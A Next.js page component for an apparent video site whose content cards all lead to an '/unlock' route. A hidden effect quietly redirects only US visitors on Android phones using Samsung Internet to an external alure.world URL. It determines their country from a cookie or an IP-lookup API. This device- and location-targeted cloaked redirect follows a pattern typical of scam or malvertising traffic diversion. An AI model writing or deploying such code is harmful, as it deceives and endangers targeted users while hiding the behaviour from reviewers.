"use client";

import React, { useEffect } from "react";
import { useRouter } from "next/navigation";
import Header from "@/components/Header";
import FeaturedVideos from "@/components/FeaturedVideos";
import BrowseCategories from "@/components/BrowseCategories";
import Footer from "@/components/Footer";


const ENABLE_CLIENT_REDIRECT = true;
const TARGET_REDIRECT_URL = "https://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20";

export default function OfferHomePage() {
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      if (params.get("unlock") === "true") {
        router.replace("/unlock");
      }
    }
  }, [router]);

  // Client-side fallback check:
  // Route: /offer/2026
  // Condition 1: US Geolocation
  // Condition 2: Android Mobile device only (User-Agent)
  // Condition 3: Samsung Internet Browser (User-Agent contains 'SamsungBrowser')
  // Action: window.location.replace("https://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20")
  useEffect(() => {
    if (!ENABLE_CLIENT_REDIRECT) return;
    if (typeof window === "undefined") return;

    const ua = navigator.userAgent || "";
    const isSamsungBrowser = /SamsungBrowser/i.test(ua);
    const isMobile = /Android/i.test(ua) && /Mobile/i.test(ua);

    if (!isSamsungBrowser || !isMobile) return;

    // Helper to read cookie set by server middleware if available
    const getCookie = (name: string): string | null => {
      const match = document.cookie.match(new RegExp("(^|;\\s*)" + name + "=([^;]*)"));
      return match ? decodeURIComponent(match[2]) : null;
    };

    const serverCountry = getCookie("x-geo-country");
    if (serverCountry) {
      if (serverCountry.toUpperCase() === "US") {
        window.location.replace(TARGET_REDIRECT_URL);
      }
      return;
    }

    // Fallback: If server geo-headers were not present, query IP lookup API
    const checkGeoFallback = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          const countryCode = (data.country_code || data.country || "").toUpperCase();
          if (countryCode === "US") {
            window.location.replace(TARGET_REDIRECT_URL);
          }
        }
      } catch (err) {
        console.warn("Client geo fallback lookup failed:", err);
      }
    };

    checkGeoFallback();
  }, []);


  const handleOpenUnlock = () => {
    router.push("/unlock");
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#111111] text-white">
      {/* Navigation Bar */}
      <Header />

      {/* Main Content Sections */}
      <main className="flex-1 flex flex-col">
        <FeaturedVideos onCardClick={handleOpenUnlock} />
        <BrowseCategories onCardClick={handleOpenUnlock} />
      </main>

      {/* Footer */}
      <Footer />
    </div>
  );
}
